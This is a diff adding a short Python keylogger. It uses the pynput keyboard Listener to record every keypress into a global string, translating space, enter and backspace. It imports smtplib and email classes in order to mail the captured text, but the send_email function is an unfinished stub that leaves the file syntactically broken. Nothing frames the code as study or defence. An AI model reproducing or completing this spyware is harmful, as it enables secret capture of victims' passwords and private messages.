@@ -1,0 +1,29 @@
+from pynput.keyboard import Listener
+import smtplib
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+
+keystrokes = ""
+
+def log_happykey(key):
+    global keystrokes
+    key = str(key).replace("'", "")
+
+    if key == 'Key.space':
+        key = ' '
+    elif key == 'Key.enter':
+        key = '\n'
+    elif key == 'Key.shift':
+        key = ''
+    elif key == 'Key.backspace':
+        key = '<'
+
+    keystrokes += key
+
+
+def send_email(content):
+
+#Need to do more research on this
+
+with Listener(on_press=log_happykey) as listener:
+    listener.join()
